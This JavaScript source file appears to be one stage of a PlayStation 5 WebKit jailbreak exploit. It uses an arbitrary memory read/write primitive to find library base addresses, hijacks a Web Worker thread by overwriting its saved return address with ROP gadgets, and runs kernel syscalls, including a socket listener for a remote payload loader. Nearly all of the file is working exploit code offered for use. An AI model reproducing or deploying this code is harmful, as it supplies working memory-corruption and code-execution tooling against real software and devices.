function countFingerprints(p, stack, expected) {
  let count = 0;
  for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
    const v = p.read8(stack.add32(offset));
    if (v.low === expected.low && v.hi === expected.hi) count++;
  }
  return count;
}

async function findWorkerStack(p, libKernelBase) {
  const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
  const PTHREAD_STACK_ADDR_OFFSET = 0xa8;
  const PTHREAD_STACK_SIZE_OFFSET = 0xb0;

  const plausible = (a) =>
    a.hi >= 0 && a.hi < 0x8000 && a.low >= 0x10000 && (a.low & 0x7) === 0;

  const head = libKernelBase.add32(OFFSET_lk__thread_list);

  // Collect every plausibility-gated 0x80000 stack.
  const stacks = [];
  let steps = 0;
  for (
    let thread = p.read8(head);
    thread.low != 0x0 && thread.hi != 0x0 && steps++ < 512;
  ) {
    if (!plausible(thread)) break;

    const next = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET));
    const stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
    const stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
    if (stacksz.hi === 0 && stacksz.low === 0x80000 && plausible(stack))
      stacks.push(stack);
    thread = next;
  }
  if (stacks.length === 0)
    throw new Error(`failed to find worker. (libkernel thread_list @ 0x${head.toString()}; scanned ${steps} thread nodes)`);

  // fingerprint-select. The rop_slave thread parks in the libkernel
  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  for (let attempt = 0; attempt < 50; attempt++) {
    const hits = stacks.filter((stack) =>
      countFingerprints(p, stack, expected) > 0,
    );
    if (hits.length === 1) return hits[0];
    if (hits.length === 0) {
      await new Promise((resolve) => setTimeout(resolve, 1));
      continue;
    }
    throw new Error(`worker-stack signature ambiguous: ${hits.length}/${stacks.length} plausible 0x80000 stacks are parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)}`);
  }
  throw new Error(`no plausible 0x80000 stack parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)} after retries (${stacks.length} candidates scanned)`);
}

async function findWorkerReturnSlot(p, stack, libKernelBase) {
  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  let lastCount = 0;

  for (let attempt = 0; attempt < 50; attempt++) {
    let hit = null;
    let count = 0;
    for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
      const candidate = stack.add32(offset);
      const value = p.read8(candidate);
      if (value.low !== expected.low || value.hi !== expected.hi) continue;

      hit = candidate;
      count++;
    }
    if (count === 1) {
      return hit;
    }
    lastCount = count;
    await new Promise((resolve) => setTimeout(resolve, 1));
  }
  throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
}

function log(message, type = "log") {
  window.writeLog(message, type);
}
log.startBox = (opts) => {
  if (typeof window !== "undefined" && typeof window.startLogBox === "function") {
    return window.startLogBox(opts);
  }
};
log.endBox = () => {
  if (typeof window !== "undefined" && typeof window.endLogBox === "function") {
    return window.endLogBox();
  }
};

const ROP_WAIT_MS = 20000;
// Time to wait for the worker to be parked in its libkernel wait before arming
// a chain onto it, see waitForPark() in prepareRop().
const ROP_PARK_MS = 10000;
// restoreHook() writes the saved return-address fingerprint before the worker
// has finished unwinding its message handler. Require a quiet interval with
// that fingerprint before treating the slot as proof that the worker is ready
// for another chain.
const ROP_PARK_SETTLE_MS = 1;

function jbmark(tag, detail) {
  try {
    if (window.jb && typeof window.jb.mark === "function")
      window.jb.mark(tag, String(detail));
  } catch (e) {}
}

async function prepareRop(p) {
  const ctor = globalThis.__ps5NativeCtor;
  let webkitBase;
  if (typeof ctor === "number" && typeof OFFSET_wk_host_constructor_candidates !== "undefined") {
    for (const offset of OFFSET_wk_host_constructor_candidates) {
      const candidate = ctor - offset;
      if (candidate >= 0x800000000 && candidate < 0x900000000 && candidate % 0x4000 === 0) {
        webkitBase = candidate;
        break;
      }
    }
  }
  if (webkitBase === undefined)
    throw new Error("no host-constructor candidate gave a valid base (ctor=0x" + String(ctor) + ")");
  const libSceNKWebKitBase = new int64(webkitBase % 0x100000000,
    Math.floor(webkitBase / 0x100000000));

  let libSceLibcInternalBase = p.read8(
    libSceNKWebKitBase.add32(OFFSET_wk_memset_import),
  );
  libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

  let libKernelBase = p.read8(
    libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import),
  );
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

  const gadgets = {};
  const syscalls = {};

  for (const gadget in wk_gadgetmap) {
    gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
  }
  for (const sysc in syscall_map) {
    syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
  }

  const allocations = [];

  function malloc(size, type = 4) {
    const backing =
      type === 1
        ? new Uint8Array(1000 + size)
        : new Uint32Array(0x10000 + size);
    allocations.push(backing);

    const ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function stringify(str) {
    const bufView = new Uint8Array(str.length + 1);
    for (let i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xff;
    }

    const ptr = p.read8(p.leakval(bufView).add32(0x10));
    ptr.backing = bufView;
    return ptr;
  }

  function writestr(addr, str) {
    let waddr = addr.add32(0);
    if (typeof str == "string") {
      for (let i = 0; i < str.length; i++) {
        let byte = str.charCodeAt(i);
        if (byte == 0) {
          break;
        }
        p.write1(waddr, byte);
        waddr.add32inplace(0x1);
      }
    }
    p.write1(waddr, 0x0);
  }

  const worker = makeRopWorker();

  async function waitForWorker() {
    return new Promise((resolve, reject) => {
      worker.onmessage = () => resolve();
      worker.onerror = () => reject(new Error("Worker failed to load"));
      worker.postMessage(0);
    });
  }

  jbmark("Worker", "waiting");
  await waitForWorker();
  jbmark("Worker", "ready");

  const workerStack = await findWorkerStack(p, libKernelBase);
  const originalContext = malloc(0x40);

  const returnAddress = await findWorkerReturnSlot(p, workerStack, libKernelBase);
  const originalReturnAddress = p.read8(returnAddress);
  const stackPointerSlot = returnAddress.add32(0x8);

  function prepareChain(chain) {
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
  }

  // Put the worker's real return address back into its parked slot. The hook is
  // only valid while a chain is staged; leaving it installed while idle means a
  // spurious wake pivots RSP into a cleared (zeroed) chain buffer and executes
  // garbage on the worker thread (SIGSEGV / console freeze, see
  // the worker's cleared chain buffer). The next launch re-arms it.
  function restoreHook() {
    p.write8(returnAddress, originalReturnAddress);
  }

  // The chain is consumed by the worker's kernel-side wake `ret` through the
  // armed slot, so the worker must be parked in the libkernel wait at launch
  // time. If it is awake inside its JS event loop, postMessage(0) is consumed
  // directly by JS and answered immediately without the staged chain running;
  // armedCall() then reports the chain as never executed. When the worker is
  // parked, its saved return slot holds `originalReturnAddress` (the
  // libkernel worker-wait fingerprint captured at boot), so checking that slot
  // before arming gates the launch on the park state.
  function workerParked() {
    const slot = p.read8(returnAddress);
    return slot.hi === originalReturnAddress.hi && slot.low === originalReturnAddress.low;
  }

  async function waitForPark(what) {
    const deadline = Date.now() + ROP_PARK_MS;
    let parkedSince = null;
    while (true) {
      if (workerParked()) {
        if (parkedSince === null) parkedSince = Date.now();
        if (Date.now() - parkedSince >= ROP_PARK_SETTLE_MS) return;
      } else {
        parkedSince = null;
      }

      if (Date.now() >= deadline)
        throw new Error(`the worker never returned to its parked slot before the ${what} - ` +
          `refusing to arm a chain onto a worker that is awake. (Reload.)`);
      await new Promise((resolve) => setTimeout(resolve, 1));
    }
  }

  // Launch chain without awaiting worker completion (for blocking syscalls like accept).
  // NOTE: this path intentionally leaves the hook installed, because the worker
  // consumes the slot when the pending syscall (accept) completes asynchronously;
  // net.js restores the chain via waitDetached().
  async function launchChainDetached(chain) {
    await waitForPark("detached chain launch");
    const originalStackPointer = p.read8(stackPointerSlot);
    chain.push_write8(originalContext, originalReturnAddress);
    chain.push_write8(originalContext.add32(0x10), returnAddress);
    chain.push_write8(stackPointerSlot, originalStackPointer);
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

    p.write8(returnAddress, gadgets["pop rsp"]);
    p.write8(stackPointerSlot, chain.stack_entry_point);

    worker.onmessage = () => {};
    worker.postMessage(0);
  }

  // Opt-in, scoped counters. Normal calls never read the profiling clock.
  let workerTiming = null;
  async function measureWorkerCalls(fn) {
    if (workerTiming) throw new Error("worker timing is already active");
    if (typeof fn !== "function") throw new Error("worker timing needs a callback");
    if (typeof performance === "undefined" || typeof performance.now !== "function")
      throw new Error("worker timing requires performance.now");
    const timing = {calls: 0, completed: 0, parkFailures: 0, timeouts: 0,
      parkMs: 0, setupMs: 0, completionMs: 0, clockErrors: 0};
    workerTiming = timing;
    try {
      const result = await fn();
      return {result, timing: Object.assign({}, timing)};
    } finally {
      workerTiming = null;
    }
  }
  function addWorkerTiming(timing, field, start) {
    const end = performance.now();
    const elapsed = end - start;
    if (!Number.isFinite(elapsed) || elapsed < 0) timing.clockErrors++;
    else timing[field] += elapsed;
    return end;
  }

  async function launchChain(chain) {
    const timing = workerTiming;
    let phaseStart = timing ? performance.now() : 0;
    if (timing) timing.calls++;
    try {
      await waitForPark("chain launch");
    } catch (error) {
      if (timing) {
        addWorkerTiming(timing, "parkMs", phaseStart);
        timing.parkFailures++;
      }
      throw error;
    }
    if (timing) phaseStart = addWorkerTiming(timing, "parkMs", phaseStart);
    const originalStackPointer = p.read8(stackPointerSlot);
    chain.push_write8(originalContext, originalReturnAddress);
    chain.push_write8(originalContext.add32(0x10), returnAddress);
    chain.push_write8(stackPointerSlot, originalStackPointer);
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

    p.write8(returnAddress, gadgets["pop rsp"]);
    p.write8(stackPointerSlot, chain.stack_entry_point);

    if (timing) phaseStart = addWorkerTiming(timing, "setupMs", phaseStart);
    const completed = await new Promise((resolve) => {
      let settled = false;
      let timer;
      const finish = (value) => {
        if (settled) return;
        settled = true;
        clearTimeout(timer);
        resolve(value);
      };
      worker.onmessage = () => finish(true);
      timer = setTimeout(() => finish(false), ROP_WAIT_MS);
      worker.postMessage(0);
    });

    if (timing) {
      addWorkerTiming(timing, "completionMs", phaseStart);
      if (completed) timing.completed++;
      else timing.timeouts++;
    }

    if (!completed) {
      // Even if the chain is still in flight, restoring the slot is the
      // correct recovery: the chain epilogue longjmps to this slot and rets
      // back into the worker's normal park.
      restoreHook();
      throw new Error(`the rop worker never answered in ${ROP_WAIT_MS / 1000}s - refusing to continue on a chain that never ran. (Reload.)`);
    }
    restoreHook();
  }

  const runtime = {
    write8: p.write8,
    write4: p.write4,
    write2: p.write2,
    write1: p.write1,
    read8: p.read8,
    read4: p.read4,
    read2: p.read2,
    read1: p.read1,
    readInto: p.readInto,
    writeBytes: p.writeBytes,
    probeMemoryWindow: p.probeMemoryWindow,
    memoryWindowSize: p.memoryWindowSize,
    leakval: p.leakval,
    pre_chain: prepareChain,
    launch_chain: launchChain,
    measureWorkerCalls,
    launch_chain_detached: launchChainDetached,
    malloc,
    stringify,
    writestr,
    libSceLibcInternalBase,
    libKernelBase,
    syscalls,
    gadgets,
  };

  const chain = new worker_rop(runtime);

  const JB_POISON = new int64(0xdeadbeef, 0x00c0ffee);

  // A spurious wake can make the worker fire onmessage without ever running the
  // staged chain; the payload would then read a stale slot as the syscall
  // result. Seed the return slot before each launch and refuse the result when
  // the chain provably never executed.
  const baseCall = chain.call.bind(chain);
  chain.call = async function armedCall(rip, rdi, rsi, rdx, rcx, r8, r9) {
    p.write8(chain.return_value, JB_POISON);
    const result = await baseCall(rip, rdi, rsi, rdx, rcx, r8, r9);
    if (result.low == JB_POISON.low && result.hi == JB_POISON.hi) {
      throw new Error("worker chain did not execute; the return slot still holds the poison marker");
    }
    return result;
  };

  p.write8(chain.return_value, JB_POISON);
  const pid = await chain.syscall(SYS_GETPID);
  if (pid.low == 0) {
    throw new Error("WebKit exploit failed.");
  }
  jbmark("Worker chain", "ready");

  return { p: runtime, chain };
}

// Verify module syscall numbers against global constants in syscalls.js
function verifySyscallNumbers(mod) {
  const expected = {
    SOCKET: SYS_SOCKET, SETSOCKOPT: SYS_SETSOCKOPT, BIND: SYS_BIND,
    LISTEN: SYS_LISTEN, GETSOCKNAME: SYS_GETSOCKNAME, ACCEPT: SYS_ACCEPT,
    READ: SYS_READ, WRITE: SYS_WRITE, CLOSE: SYS_CLOSE, GETPID: SYS_GETPID,
  };
  const names = Object.keys(mod.CALL);
  for (const name of names) {
    const fromGlobals = expected[name];
    if (typeof fromGlobals !== "number")
      throw new Error(`a module uses ${name}, which has no SYS_ global`);
    const fromModule = mod.CALL[name];
    if (fromGlobals !== fromModule)
      throw new Error(
        `syscall number drift for ${name}: syscalls.js says 0x${fromGlobals.toString(16)}, ` +
        `the module says 0x${fromModule.toString(16)}`);
  }
  return names.length;
}

// Standalone builds supply a Blob worker through ropWorkerFactory.
function makeRopWorker() {
  const factory = (typeof window !== "undefined" && window.ropWorkerFactory) || null;
  if (!factory) return new Worker("./src/utils/rop_slave.js");
  const worker = factory();
  if (!worker || typeof worker.postMessage !== "function") {
    throw new Error(
      "window.ropWorkerFactory did not return a Worker. It must return an object with " +
      "postMessage() -- a real Worker, typically built from a Blob URL.");
  }
  return worker;
}

// Use the inline module registry when present; otherwise import from the page.
async function loadModule(path) {
  const loader = (typeof window !== "undefined" && window.moduleLoader) || null;
  if (loader) return await loader(path);
  // Indirect eval resolves imports against the page URL.
  return await (0, eval)('import(' + JSON.stringify(path) + ')');
}

// With serve:false, return { p, chain } for the inline queue.
async function main(userlandRW, { serve = true } = {}) {

  const { p, chain } = await prepareRop(userlandRW);
  log("userland ready: ARW + hijacked worker + ROP chain", "success");

  // ?probe=1 runs the socket diagnostic instead of the remote loader.
  let probeMode = false;
  try {
    probeMode = new URLSearchParams(location.search).get("probe") === "1";
  } catch (e) {}

  if (probeMode) {
    const probe = await loadModule("./socket_test.js");
    const checked = verifySyscallNumbers(probe);
    log(`syscall numbers cross-checked against syscalls.js (${checked})`, "info");
    const result = await probe.runSocketTest(p, chain, log);
    if (!result || !result.done)
      throw new Error(`socket test did not finish (stage: ${result && result.stage})`);
    log(`socket test complete on port ${result.port}`, "success");
    return { p, chain };
  }

  const { runLoader } = await loadModule("./loader.js");
  const { CALL: netCall } = await loadModule("./net.js");
  const checked = verifySyscallNumbers({ CALL: netCall });
  log(`syscall numbers cross-checked against syscalls.js (${checked})`, "info");

  if (!serve) {
    // No listener, and that is the point: there is no client to accept one.
    return { p, chain };
  }

  await runLoader(p, chain, log);
}

// Load the firmware table from the inline registry or the host.
// Mark rejections handled here; site.js reports them when it awaits the table.
const offsetsRequest = (() => {
  if (typeof window !== "undefined" && typeof window.offsetsInline === "function") {
    return Promise.resolve().then(() => window.offsetsInline(window.fw_str));
  }
  return new Promise((resolve, reject) => {
    const fwScript = document.createElement("script");
    fwScript.onload = () => resolve();
    fwScript.onerror = () => reject(new Error(`Failed to load offsets/${window.fw_str}.js`));
    fwScript.setAttribute("src", `offsets/${window.fw_str}.js`);
    document.body.appendChild(fwScript);
  });
})();
offsetsRequest.catch(() => {});
window.offsetsLoaded = offsetsRequest;
